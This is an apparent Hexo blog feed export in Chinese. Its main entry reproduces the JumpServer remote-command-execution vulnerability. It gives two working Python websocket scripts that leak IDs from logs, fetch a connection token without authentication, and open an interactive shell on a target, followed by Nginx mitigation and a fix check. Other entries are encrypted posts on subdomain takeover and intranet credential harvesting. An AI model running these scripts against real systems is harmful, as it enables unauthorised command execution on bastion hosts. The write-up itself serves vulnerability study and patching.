class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@xstark:~<span class="comment">#  pip3 install</span></span><br><span class="line">ERROR: You must give at least one requirement to install (see <span class="string">&quot;pip help install&quot;</span>)</span><br><span class="line">WARNING: You are using pip version 19.2.3, however version 21.0.1 is available.</span><br><span class="line">You should consider upgrading via the <span class="string">&#x27;pip install --upgrade pip&#x27;</span> <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">root@xstark:~<span class="comment"># pip3 install --upgrade pip</span></span><br><span class="line">Collecting pip</span><br><span class="line">  Downloading https://files.pythonhosted.org/packages/fe/ef/60d7ba03b5c442309ef42e7d69959f73aacccd0d86008362a681c4698e83/pip-21.0.1-py3-none-any.whl (1.5MB)</span><br><span class="line">     |████████████████████████████████| 1.5MB 15.9MB/s</span><br><span class="line">Installing collected packages: pip</span><br><span class="line">  Found existing installation: pip 19.2.3</span><br><span class="line">    Uninstalling pip-19.2.3:</span><br><span class="line">      Successfully uninstalled pip-19.2.3</span><br><span class="line">Successfully installed pip-21.0.1</span><br></pre></td></tr></table></figure><blockquote><p>参考链接：<a href="https://choudalao.com/article/100">https://choudalao.com/article/100</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;日常学习工作总需要一台 Linux 主机，但是每次需要配置环境的时候会很繁琐，因此用本文记录一下新装 Linux 的环境配置</summary>
      
    
    
    
    <category term="Note" scheme="https://www.lintstar.top/categories/Note/"/>
    
    
    <category term="CentOS" scheme="https://www.lintstar.top/tags/CentOS/"/>
    
    <category term="VPS" scheme="https://www.lintstar.top/tags/VPS/"/>
    
    <category term="Nginx" scheme="https://www.lintstar.top/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>JumpServer RCE 漏洞复现</title>
    <link href="https://www.lintstar.top/2021/01/a3a6c3e5.html"/>
    <id>https://www.lintstar.top/2021/01/a3a6c3e5.html</id>
    <published>2021-01-31T04:00:58.000Z</published>
    <updated>2021-02-02T05:29:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><strong>JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统，通俗来说就是跳板机。JumpServer 使用 Python / Django 进行开发。</strong></p><h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p><strong>2021年1月15日，JumpServer发布更新，修复了一处远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取到日志文件获取敏感信息，或者执行相关API操作控制其中所有机器，执行任意命令。</strong></p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li><p><strong>JumpServer &lt; v2.6.2</strong></p></li><li><p><strong>JumpServer &lt; v2.5.4</strong></p></li><li><p><strong>JumpServer &lt; v2.4.5</strong></p></li><li><p><strong>JumpServer = v1.5.9</strong></p></li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>JumpServer v2.6.1</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行脚本并运行</span></span><br><span class="line">➜ curl -sSL https://github.com/jumpserver/jumpserver/releases/download/v2.6.1/quick_start.sh| bash</span><br><span class="line">➜ ./quick_start.sh</span><br><span class="line">➜ <span class="built_in">cd</span> /opt/jumpserver-installer-v2.6.2</span><br><span class="line">➜ ./jmsctl.sh start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果安装版本不是 v2.6.1</span></span><br><span class="line">➜ ./jmsctl.sh upgrade v2.6.1</span><br></pre></td></tr></table></figure><p><strong>访问 <a href="http://ip:8080/">http://IP:8080</a> 初始账号密码为 admin/admin</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210202122948.png" alt="image-20210202122948517"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol><li><strong>未授权的情况下能够建立 websocket 连接</strong></li><li><strong>task 可控，可以通过 websocket 对日志文件进行读取</strong></li><li><strong>需要通过 <code>/opt/jumpserver/logs/jumpserver</code> 获取 <code>system_user</code> 、<code>user</code> 、<code>asset</code> 三个 id 的值</strong></li><li><strong>通过这三个 id 获取一个临时 token</strong></li><li><strong>通过临时 token 进入 koko 的 tty，然后执行命令</strong></li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210202123659.png" alt="image-20210202123659105"></p><h2 id="漏洞脚本"><a href="#漏洞脚本" class="headerlink" title="漏洞脚本"></a>漏洞脚本</h2><p><strong>运行脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;/ws/ops/tasks/log/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main_logic</span>(<span class="params">t</span>):</span></span><br><span class="line">    print(<span class="string">&quot;#######start ws&quot;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(t) <span class="keyword">as</span> client:</span><br><span class="line">        <span class="keyword">await</span> client.send(json.dumps(&#123;<span class="string">&quot;task&quot;</span>:<span class="string">&quot;/opt/jumpserver/logs/gunicorn&quot;</span>&#125;))</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            ret = json.loads(<span class="keyword">await</span> client.recv())</span><br><span class="line">            print(ret[<span class="string">&quot;message&quot;</span>], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;http://45.xx.xx.xx:8080&quot;</span></span><br><span class="line">    target = host.replace(<span class="string">&quot;https://&quot;</span>, <span class="string">&quot;wss://&quot;</span>).replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;ws://&quot;</span>) + url</span><br><span class="line">    print(<span class="string">&quot;target: %s&quot;</span> % (target,))</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main_logic(target))</span><br></pre></td></tr></table></figure><p><strong>获取到 <code>asset</code> ，<code>system_user</code> ，<code>user</code> 三个ID值：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210131203700.png" alt="image-20210131203700482"></p><blockquote><p><strong>或者使用 chorme 插件读取：<a href="https://chrome.google.com/webstore/detail/websocket-test-client/fgponpodhbmadfljofbimhhlengambbn/related">WebSocket Test Client</a></strong></p></blockquote><p><strong>将 <code>asset</code> ，<code>system_user</code> ，<code>user</code> 三个ID值填入下面脚本：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aioconsole</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;/api/v1/authentication/connection-token/?user-only=1&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_celery_task_log_path</span>(<span class="params">task_id</span>):</span></span><br><span class="line">    task_id = str(task_id)</span><br><span class="line">    rel_path = os.path.join(task_id[<span class="number">0</span>], task_id[<span class="number">1</span>], task_id + <span class="string">&quot;.log&quot;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&quot;/opt/jumpserver/&quot;</span>, rel_path)</span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span>(<span class="params">websocket, _text</span>):</span></span><br><span class="line">    <span class="keyword">if</span> _text == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        print(<span class="string">f&#x27;you have enter &quot;exit&quot;, goodbye&#x27;</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.close(reason=<span class="string">&quot;user exit&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">await</span> websocket.send(_text)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_loop</span>(<span class="params">ws, session_id</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmdline = <span class="keyword">await</span> aioconsole.ainput()</span><br><span class="line">        <span class="keyword">await</span> send_msg(</span><br><span class="line">            ws,</span><br><span class="line">            json.dumps(</span><br><span class="line">                &#123;<span class="string">&quot;id&quot;</span>: session_id, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_DATA&quot;</span>, <span class="string">&quot;data&quot;</span>: cmdline + <span class="string">&quot;\n&quot;</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">        )</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">recv_loop</span>(<span class="params">ws</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        recv_text = <span class="keyword">await</span> ws.recv()</span><br><span class="line">        ret = json.loads(recv_text)</span><br><span class="line">        <span class="keyword">if</span> ret.get(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;TERMINAL_DATA&quot;</span>):</span><br><span class="line">            <span class="keyword">await</span> aioconsole.aprint(ret[<span class="string">&quot;data&quot;</span>], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 客户端主逻辑</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main_logic</span>():</span></span><br><span class="line">    print(<span class="string">&quot;#######start ws&quot;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(target) <span class="keyword">as</span> client:</span><br><span class="line">        recv_text = <span class="keyword">await</span> client.recv()</span><br><span class="line">        print(<span class="string">f&quot;<span class="subst">&#123;recv_text&#125;</span>&quot;</span>)</span><br><span class="line">        session_id = json.loads(recv_text)[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        print(<span class="string">&quot;get ws id:&quot;</span> + session_id)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;init ws&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;###############&quot;</span>)</span><br><span class="line">        inittext = json.dumps(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: session_id,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;TERMINAL_INIT&quot;</span>,</span><br><span class="line">                <span class="string">&quot;data&quot;</span>: <span class="string">&#x27;&#123;&quot;cols&quot;:164,&quot;rows&quot;:17&#125;&#x27;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">await</span> send_msg(client, inittext)</span><br><span class="line">        <span class="keyword">await</span> asyncio.gather(recv_loop(client), send_loop(client, session_id))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;http://45.xx.xx.xx:8080&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;whoami&quot;</span></span><br><span class="line">    <span class="keyword">if</span> host[<span class="number">-1</span>] == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        host = host[:<span class="number">-1</span>]</span><br><span class="line">    print(host)</span><br><span class="line">    data = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;eb02ebb2-62f9-43fc-8eb3-25a84ff27e95&quot;</span>, <span class="string">&quot;asset&quot;</span>: <span class="string">&quot;2bc20e9a-523d-4219-8087-75cd73bbd998&quot;</span>,</span><br><span class="line">            <span class="string">&quot;system_user&quot;</span>: <span class="string">&quot;bd6e6ee6-8f89-46c9-b907-58126d40dc84&quot;</span>&#125;</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;get token url:%s&quot;</span> % (host + url,))</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    res = requests.post(host + url, json=data)</span><br><span class="line">    token = res.json()[<span class="string">&quot;token&quot;</span>]</span><br><span class="line">    print(<span class="string">&quot;token:%s&quot;</span>, (token,))</span><br><span class="line">    print(<span class="string">&quot;##################&quot;</span>)</span><br><span class="line">    target = (</span><br><span class="line">        <span class="string">&quot;ws://&quot;</span> + host.replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;/koko/ws/token/?target_id=&quot;</span> + token</span><br><span class="line">    )</span><br><span class="line">    print(<span class="string">&quot;target ws:%s&quot;</span> % (target,))</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main_logic())</span><br></pre></td></tr></table></figure><p><strong>成功获取权限：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210131210222.png" alt="image-20210131210222612"></p><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p><strong>1、建议 JumpServer 堡垒机（含社区版及企业版）用户升级至安全版本</strong></p><p><strong>2、临时修复方案：</strong></p><p><strong>修改 Nginx 配置文件，以屏蔽漏洞接口 ：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/api/v1/authentication/connection-token/</span><br><span class="line">/api/v1/users/connection-token/</span><br></pre></td></tr></table></figure><p><strong>Nginx 配置文件位置如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 社区老版本</span></span><br><span class="line">/etc/nginx/conf.d/jumpserver.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 企业老版本</span></span><br><span class="line">jumpserver-release/nginx/http_server.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新版本在</span></span><br><span class="line">jumpserver-release/compose/config_static/http_server.conf</span><br></pre></td></tr></table></figure><p><strong>Nginx 配置文件实例为：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 保证在 /api 之前 和 / 之前</span></span><br><span class="line">location /api/v1/authentication/connection-token/ &#123;</span><br><span class="line">   <span class="built_in">return</span> 403;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">location /api/v1/users/connection-token/ &#123;</span><br><span class="line">   <span class="built_in">return</span> 403;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新增以上这些 </span></span><br><span class="line">location /api/ &#123;</span><br><span class="line">   proxy_set_header X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">   proxy_set_header Host <span class="variable">$host</span>;</span><br><span class="line">   proxy_set_header X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">   proxy_pass http://core:8080;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>修改配置文件完毕后，重启 Nginx 服务即可</strong></p><p><strong>修复验证：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://github.com/jumpserver/jumpserver/releases/download/v2.6.2/jms_bug_check.sh </span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用方法 bash jms_bug_check.sh HOST </span></span><br><span class="line">$ bash jms_bug_check.sh demo.jumpserver.org</span><br><span class="line">漏洞已修复</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://github.com/Skactor/jumpserver_rce">https://github.com/Skactor/jumpserver_rce</a></li><li><a href="https://saucer-man.com/information_security/520.html">https://saucer-man.com/information_security/520.html</a></li><li><a href="https://www.o2oxy.cn/2921.html">https://www.o2oxy.cn/2921.html</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统</summary>
      
    
    
    
    <category term="Note" scheme="https://www.lintstar.top/categories/Note/"/>
    
    <category term="Web" scheme="https://www.lintstar.top/categories/Note/Web/"/>
    
    
    <category term="Python" scheme="https://www.lintstar.top/tags/Python/"/>
    
    <category term="Vulnerability" scheme="https://www.lintstar.top/tags/Vulnerability/"/>
    
    <category term="WebSocket" scheme="https://www.lintstar.top/tags/WebSocket/"/>
    
    <category term="RCE" scheme="https://www.lintstar.top/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>子域名接管</title>
    <link href="https://www.lintstar.top/2021/01/9072ee96.html"/>
    <id>https://www.lintstar.top/2021/01/9072ee96.html</id>
    <published>2021-01-25T04:00:58.000Z</published>
    <updated>2021-03-08T08:41:15.000Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">本文已加密 <br> 论一名合格的 FOFA 工程师的自我修养</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="ff0bb1a852855a2af57559e57107dd173bfeb69529c4b6fade8fe22c3e359f21">a8af586a26b9f637745602962664331bad848238cd23ac0ee7f59954861211c4621a4a1eee1033ce40e4306980b7b0d7acb9f6428aadb49de5b199a85e6d6f6065d0b52c15e8b74f096e6600ab0dbd114892fc7088dcecb6f9df2f45bcd41d8d2430e914a873208cd3c898d0fb2317e54e2dfe4ad1346c1de05339fbb5a991a7359539842ad67d815ca806797efaf3e7d00fc457070077bdcf08336d163c22eba8fe33ecbe6d0b26637012612aed2179d4e763e7ec1d6a78fe9535fff55ad4f1da8c6145c3eb75a79ca35626de64d46bf64fb5779943a605c7d00787d38d9fb12415371e019ad447e967d16f415c044dde1e20aef05113c96a2e97e3acae03ba70c7eddf54eb609107887d1db44d1b529d99787c8ea84766224019c3b107185c53059f15177dac2eccbb231c45128f776cbdb2b91709bcb5c4544ec2e6fc1ce48fea11f1dcaffc63d135d61e39ecaee07107784a5e8cc40159686290eb4826b8c595411936f657421120fca124a48bc453659b25424dc86f03455d5bf0c24787cc692f9b0b23c6cab616f67d1a908f22523b0514dc7eff84a6c11207d65cc04e11b833507f3091a0da4587f2ac1bac90359c68219c037428c06c4f88c50b827b846bd7378679cc979f245cafd45ba310a62646fc86ebefde0d93ce2d964c47e4c17802a9d08c1d38d43a4d671a02c0611622e4eadd4ecbb59bae9a2039c9acd399d9759a21533c6f730ac21ca2e526a94d87d88ed367edff9fbe57f749af438c214b6ac81864d4e9597781ad759e9ff97ef084b8b78f38b8f8428a9b044addf6345c422c83a300c63e38726538a5ae8730d101fc6f44fcb708d590746ddbd906ad5a6a59dd5091601c0101a93c363f8b2576b652583a51223796b284201e2ec75244b55de181286e2920978858675510131fa4d3d065875f5a7df4da85e11eab2e382ef34ac4a79d30096dd1d61bfb2b4a7ea7541f64c38d150225a712a4bc16500d305d8e291f352edbf112a17991298463d1f43261cf3e23339eb01afd09df4a70633699dd62ab9195b61af50130c3bfe01db42477c33123e530c98829c871073c06e5aae731175236339a29e0f4f5b469ba79b4d47bb4640cc4d69eae06abaf785a2a123a321fe1a8b6a6b22dd387ad077959b725c1afe93a150b6b2ea930e18f9680fad357934c4af3b2bb3736ea2198fc9bff48019d8f97e17b580860e87061a82fac9a1d6bac2a32abfb87a05f46e5b91dc11c6e643bcb6751f1d65401c2f0302596816114c24f54c7b9074ac3213545327d21cacf2b04fba1f212640b2a2e5dc2dc8a53dd3cd81a8f6dc22b7b883744e89d587bc59daf811309adf89bd86c62c29330d91c62c45dc38b09d17d70c98d938e976fc16b622a8b4f121cffbd6d2752001344d28fa8ad381dae64613197c149ee7b1b92cc32df6f754713d93b4683344434ff8fa2079d3b33012d1f3f37c4abb315772693a3a34ab457c4475fef3c9f02c790bd47656fff2a858c324b9c63b23a1e2b0e7466dfe50fd5b1b9ba28abb53ca4f11a04bd5f721164f9b1ce3112ab9dff42a1ed9dcae3b5d66ffcd71a3c34722629b4213ad6a6dd73e664dc225a044a3fb5993db35c8592891dd2617911b9b32ef2aefc0bbcecb96dcd42a7ed7d1d7026d41bdb96c3f85424b98ab6a8383ad90426c6169603457a7a17140cf9eb61075813e8a4f60991c7b4e9b97367b50efe87b69bdc38a8f23d9aecb0f2fc4a8b901e736310e3047dc56c930a5dbb6834ee401d29f28856104f785b7769d107c67389af96a910f7d962167c6cfeb2f388556d35f2fac5b6c513644851d27e730d2b0d693614219d15d97b7a427820918b9e3e6a6ecaeabf948c721285cc16be87c54b815190909258709c61bd6e0257ba308e86f7b3a739286b9c5b9679b535780e84876fd75f927a07522de9c6edc535dc9b9e72db0b6fc31d3ef9cd63725f11648e2d3c1abe5750f59595e91f2f1b5b73c2d9833f544b72dbb7c1d594e80ef359f5323ebf48b70958ec85660a5bdb591038e5200a3f941f1dab74c7529b9984700ad26c2ee545fa64856870</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="Tools" scheme="https://www.lintstar.top/categories/Tools/"/>
    
    
    <category term="Attack" scheme="https://www.lintstar.top/tags/Attack/"/>
    
    <category term="Vulnerability" scheme="https://www.lintstar.top/tags/Vulnerability/"/>
    
    <category term="Subdomain" scheme="https://www.lintstar.top/tags/Subdomain/"/>
    
    <category term="Github" scheme="https://www.lintstar.top/tags/Github/"/>
    
    <category term="Fofa" scheme="https://www.lintstar.top/tags/Fofa/"/>
    
  </entry>
  
  <entry>
    <title>内网信息收集手册</title>
    <link href="https://www.lintstar.top/2021/01/b94284bf.html"/>
    <id>https://www.lintstar.top/2021/01/b94284bf.html</id>
    <published>2021-01-24T04:00:58.000Z</published>
    <updated>2021-01-27T07:45:09.000Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">本文已加密 <br> 本地基础信息 域内信息收集 <br> 进程和服务 网络信息 端口信息收集 <br> Mimikatz密码收集 哈希传递</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="25ecb57ea165cac65356d5d3fb7397045e3721bb80ae17996a0d5fd3ced38ced"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="Note" scheme="https://www.lintstar.top/categories/Note/"/>
    
    
    <category term="Attack" scheme="https://www.lintstar.top/tags/Attack/"/>
    
    <category term="Domain" scheme="https://www.lintstar.top/tags/Domain/"/>
    
    <category term="Mimikatz" scheme="https://www.lintstar.top/tags/Mimikatz/"/>
    
  </entry>
  
  <entry>
    <title>Python 实现自动登录签到及微信通知</title>
    <link href="https://www.lintstar.top/2021/01/5bf799f.html"/>
    <id>https://www.lintstar.top/2021/01/5bf799f.html</id>
    <published>2021-01-22T14:00:58.000Z</published>
    <updated>2021-02-11T04:20:24.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>零组资料文库 3.0 设置了信誉积分机制：</strong></p><table><thead><tr><th>信誉积分</th><th>权限</th></tr></thead><tbody><tr><td>0-200</td><td>六个月之前的文章</td></tr><tr><td>201-400</td><td>五个月之前的文章</td></tr><tr><td>401-600</td><td>四个月之前的文章</td></tr><tr><td>601-800</td><td>三个月之前的文章</td></tr><tr><td>801-1000</td><td>两个月之前的文章</td></tr><tr><td>1000分以上</td><td>一个月之前的文章</td></tr></tbody></table><p><strong>加分规则：</strong></p><p><strong>每日签到可加3分；投稿文章可加10分。</strong></p><blockquote><p>文库的权限是随着时间线进行推进的，也就是说即使一直是0分，也会在时间线的推进下自动递增可浏览的文章。</p></blockquote><p><strong>所以就需要一个签到脚本啦 ~</strong></p><h1 id="验证码识别"><a href="#验证码识别" class="headerlink" title="验证码识别"></a>验证码识别</h1><p><strong>因为零组的登录界面涉及到验证码</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210124120235.webp" alt="20210124_1159"></p><p><strong>需要一个验证码识别接口：</strong></p><p><strong>图鉴：<a href="http://www.ttshitu.com/">http://www.ttshitu.com/</a></strong></p><h2 id="价格"><a href="#价格" class="headerlink" title="价格"></a>价格</h2><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210122181937.png" alt="image-20210122181937953"></p><p><strong>流量包完全没必要 1块500次可以用好久</strong></p><h2 id="识别效果"><a href="#识别效果" class="headerlink" 